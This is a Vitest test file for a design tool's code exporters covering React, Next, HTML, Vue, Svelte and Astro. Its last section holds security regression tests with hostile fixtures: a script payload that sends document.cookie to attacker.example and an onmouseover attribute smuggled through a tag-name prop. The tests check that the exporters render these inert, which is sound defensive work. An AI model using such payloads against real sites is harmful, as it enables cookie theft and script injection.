import { beforeAll, describe, expect, it } from 'vitest';
import {
  PluginRegistry,
  applyOperation,
  createDocument,
  createNode,
  seededRng,
  setIdRng,
  type DesignDocument,
} from '@opendesign/core';
import { componentsPlugin, heroCentered, navbar, pricingTable } from '@opendesign/components';
import { BUILTIN_EXPORTERS, exportProject, exportersPlugin } from '../index.js';
import { toPascalCase } from '../emit/tree.js';

let registry: PluginRegistry;
let document: DesignDocument;

function buildLandingPage(): DesignDocument {
  setIdRng(seededRng(11));
  let doc = createDocument({ name: 'Acme Landing' });
  const rootId = doc.pages[0]!.rootId;

  let counter = 0;
  const createId = () => `n_${(counter += 1)}`;

  for (const [index, block] of [navbar, heroCentered, pricingTable].entries()) {
    const built = block.create({ createId, tokens: doc.tokens });
    doc = applyOperation(doc, {
      type: 'insertSubtree',
      nodes: built.nodes,
      rootId: built.rootId,
      parentId: rootId,
      index,
    }).document;
  }

  return doc;
}

beforeAll(async () => {
  registry = new PluginRegistry();
  await registry.registerAll([componentsPlugin, exportersPlugin]);
  document = buildLandingPage();
});

describe('exporter registry', () => {
  it('registers all six targets through the plugin API', () => {
    expect(
      registry
        .getExporters()
        .map((e) => e.id)
        .sort(),
    ).toEqual(['astro', 'html', 'next', 'react', 'svelte', 'vue']);
  });

  it('rejects an unknown target with a helpful message', async () => {
    await expect(exportProject(registry, document, 'flutter')).rejects.toThrow(
      /unknown export target "flutter". Available:/,
    );
  });
});

describe.each(BUILTIN_EXPORTERS.map((e) => [e.id, e] as const))('target %s', (id) => {
  it('emits a non-empty set of files', async () => {
    const result = await exportProject(registry, document, id);
    expect(result.files.length).toBeGreaterThan(0);
    expect(result.totalBytes).toBeGreaterThan(0);
    expect(result.files.every((f) => f.contents.length > 0)).toBe(true);
  });

  it('emits unique file paths', async () => {
    const { files } = await exportProject(registry, document, id);
    const paths = files.map((f) => f.path);
    expect(new Set(paths).size).toBe(paths.length);
  });

  it('carries the design tokens into the output', async () => {
    const { files } = await exportProject(registry, document, id);
    const combined = files.map((f) => f.contents).join('\n');
    expect(combined).toContain('--color-accent');
  });

  it('never leaks editor-only attributes', async () => {
    const { files } = await exportProject(registry, document, id);
    const combined = files.map((f) => f.contents).join('\n');
    expect(combined).not.toContain('data-od-id');
    expect(combined).not.toContain('data-od-type');
  });
});

describe('react output', () => {
  it('splits top-level frames into their own components and imports them', async () => {
    const { files } = await exportProject(registry, document, 'react');
    const page = files.find((f) => f.path.startsWith('src/pages/'));
    expect(page).toBeDefined();

    expect(page!.contents).toContain("from '../components/Navbar'");
    expect(page!.contents).toContain('<Navbar />');
    expect(files.some((f) => f.path === 'src/components/Navbar.tsx')).toBe(true);
    expect(files.some((f) => f.path === 'src/components/Hero.tsx')).toBe(true);
  });

  it('uses className and semantic Tailwind utilities', async () => {
    const { files } = await exportProject(registry, document, 'react');
    const hero = files.find((f) => f.path === 'src/components/Hero.tsx')!;
    expect(hero.contents).toContain('className=');
    expect(hero.contents).not.toContain('class=');
    expect(hero.contents).toMatch(/bg-|text-|gap-/);
  });

  it('self-closes void elements', async () => {
    const { files } = await exportProject(registry, document, 'react');
    const combined = files.map((f) => f.contents).join('\n');
    expect(combined).not.toMatch(/<img[^/>]*>\s*<\/img>/);
  });
});

describe('next output', () => {
  it('emits App Router files and a root layout', async () => {
    const { files } = await exportProject(registry, document, 'next');
    expect(files.some((f) => f.path === 'app/page.tsx')).toBe(true);
    expect(files.some((f) => f.path === 'app/layout.tsx')).toBe(true);
    expect(files.some((f) => f.path === 'app/globals.css')).toBe(true);

    const page = files.find((f) => f.path === 'app/page.tsx')!;
    expect(page.contents).toContain('export default function Page()');
    expect(page.contents).toContain("from '@/components/");
  });
});

describe('html output', () => {
  it('emits standalone HTML with a real stylesheet and no Tailwind', async () => {
    const { files } = await exportProject(registry, document, 'html');
    const index = files.find((f) => f.path === 'index.html')!;
    const styles = files.find((f) => f.path === 'styles.css')!;

    expect(index.contents.startsWith('<!doctype html>')).toBe(true);
    expect(index.contents).toContain('class=');
    expect(index.contents).not.toContain('className=');
    expect(styles.contents).not.toContain('@import');
    expect(styles.contents).toContain('display: flex;');
  });

  it('turns responsive overrides into media queries', async () => {
    const { files } = await exportProject(registry, document, 'html');
    const styles = files.find((f) => f.path === 'styles.css')!;
    expect(styles.contents).toContain('@media (min-width:');
  });

  it('writes void elements without a closing slash', async () => {
    const { files } = await exportProject(registry, document, 'html');
    const index = files.find((f) => f.path === 'index.html')!;
    expect(index.contents).not.toMatch(/<input[^>]*\/>/);
  });
});

describe('single-file-component outputs', () => {
  it('wraps Vue markup in a template block', async () => {
    const { files } = await exportProject(registry, document, 'vue');
    const page = files.find((f) => f.path.endsWith('.vue') && f.path.includes('pages'))!;
    expect(page.contents).toContain('<template>');
    expect(page.contents).toContain('class=');
  });

  it('emits SvelteKit routes', async () => {
    const { files } = await exportProject(registry, document, 'svelte');
    expect(files.some((f) => f.path === 'src/routes/+page.svelte')).toBe(true);
    const page = files.find((f) => f.path === 'src/routes/+page.svelte')!;
    expect(page.contents).toContain("from '$lib/components/");
  });

  it('emits Astro pages with frontmatter', async () => {
    const { files } = await exportProject(registry, document, 'astro');
    const page = files.find((f) => f.path === 'src/pages/index.astro')!;
    expect(page.contents.startsWith('---')).toBe(true);
    expect(page.contents).toContain("import '../styles/theme.css';");
  });
});

describe('naming helpers', () => {
  it('produces valid component identifiers', () => {
    expect(toPascalCase('hero centered')).toBe('HeroCentered');
    expect(toPascalCase('CTA banner!')).toBe('CTABanner');
    expect(toPascalCase('404 page')).toBe('Section404Page');
    expect(toPascalCase('')).toBe('Section');
  });
});

describe('html reset', () => {
  it('neutralises the browser defaults that would break canvas parity', async () => {
    const { files } = await exportProject(registry, document, 'html');
    const styles = files.find((f) => f.path === 'styles.css')!;

    // A default `h1 { margin: 0.67em 0 }` adds ~40px of space the designer
    // never asked for. The other targets get this from Tailwind's Preflight.
    expect(styles.contents).toMatch(/h1,[\s\S]*?margin: 0;/);
    expect(styles.contents).toMatch(/a \{[\s\S]*?text-decoration: none;/);
    expect(styles.contents).toMatch(/button,[\s\S]*?font: inherit;/);
    expect(styles.contents).toMatch(/ul,\s*\n?ol \{[\s\S]*?list-style: none;/);
  });

  it('applies the reset before the generated layout rules', async () => {
    const { files } = await exportProject(registry, document, 'html');
    const styles = files.find((f) => f.path === 'styles.css')!;
    // Order matters: node rules must win over the reset, not the other way round.
    expect(styles.contents.indexOf('/* Reset */')).toBeLessThan(
      styles.contents.indexOf('/* Layout */'),
    );
  });
});

/**
 * Regression tests for output that was structurally invalid or executable.
 *
 * All three came out of exercising the exporters against documents a real
 * client can produce: `props` is `z.record(z.unknown())`, so an import, a
 * plugin or a model can put anything in it, and ordinary marketing copy
 * contains braces and ampersands.
 */
describe('generated markup is well-formed and inert', () => {
  function withNode(props: Record<string, unknown>, type: string): DesignDocument {
    setIdRng(seededRng(31));
    const doc = createDocument({ name: 'Hostile' });
    const rootId = doc.pages[0]!.rootId;
    const node = createNode({ type, name: 'Payload', props });
    return applyOperation(doc, {
      type: 'insertSubtree',
      nodes: [node],
      rootId: node.id,
      parentId: rootId,
      index: 0,
    }).document;
  }

  async function sourcesFor(doc: DesignDocument, targetId: string): Promise<string> {
    const { files } = await exportProject(registry, doc, targetId);
    return files.map((file) => file.contents).join('\n');
  }

  async function allSources(doc: DesignDocument): Promise<string> {
    const perTarget = await Promise.all(
      BUILTIN_EXPORTERS.map((target) => sourcesFor(doc, target.id)),
    );
    return perTarget.join('\n');
  }

  it('will not let a node prop become a tag name', async () => {
    // `level: 'script'` used to emit a literal <script> element carrying the
    // node's text, in every target.
    const evil = withNode(
      { level: 'script', text: 'fetch("https://attacker.example/" + document.cookie)' },
      'heading',
    );
    const sources = await allSources(evil);

    expect(sources).not.toContain('<script class=');
    expect(sources).not.toContain('<script className=');
    expect(sources).toContain('attacker.example');
    expect(sources).toMatch(/<h2[ >]/);
  });

  it('will not let a node prop smuggle an attribute through the tag name', async () => {
    const evil = withNode(
      { as: 'div onmouseover="alert(document.domain)" data-x', text: 'hover me' },
      'text',
    );
    const sources = await allSources(evil);

    expect(sources).not.toContain('onmouseover');
    expect(sources).toMatch(/<p[ >]/);
  });

  it('closes elements that are not void, whatever the primitive declares', async () => {
    // An unclosed <textarea> is the worst case: it is a raw-text element, so
    // everything after it on the page becomes its value.
    const doc = withNode({ placeholder: 'Message', name: 'message' }, 'textarea');
    const html = await sourcesFor(doc, 'html');

    expect(html).toContain('</textarea>');
    expect(html).toMatch(/<\/body>\s*<\/html>/);
  });

  it('keeps <span> and <iframe> closed too', async () => {
    const icon = await sourcesFor(withNode({ name: 'star' }, 'icon'), 'html');
    expect(icon).toContain('</span>');

    const embed = await sourcesFor(withNode({ src: 'https://example.com' }, 'embed'), 'html');
    expect(embed).toContain('</iframe>');
  });

  it('still writes void elements unclosed in HTML and self-closed elsewhere', async () => {
    const doc = withNode({ src: 'https://example.com/a.png', alt: 'A' }, 'image');

    expect(await sourcesFor(doc, 'html')).not.toContain('</img>');
    expect(await sourcesFor(doc, 'react')).toMatch(/<img[^>]*\/>/);
  });

  it('does not let ordinary copy compile as a template expression', async () => {
    // Vue reads `{{ x }}` as interpolation; Svelte and Astro read a bare `{x}`
    // as an expression and fail to compile.
    const doc = withNode(
      { text: 'Personalise with {{ user.first_name }} — or use the {name} shorthand' },
      'text',
    );

    for (const id of ['vue', 'svelte', 'astro']) {
      const source = await sourcesFor(doc, id);

      expect(source, id).not.toContain('{{ user.first_name }}');
      expect(source, id).not.toContain('{name}');
      expect(source, id).toContain('&#123;');
    }
  });

  it('escapes ampersands in JSX text so React renders the source, not an entity', async () => {
    const doc = withNode({ text: 'Price &lt; 10 &amp; free shipping' }, 'text');

    for (const id of ['react', 'next']) {
      const source = await sourcesFor(doc, id);

      expect(source, id).toContain('&amp;lt; 10 &amp;amp; free shipping');
    }
  });
});
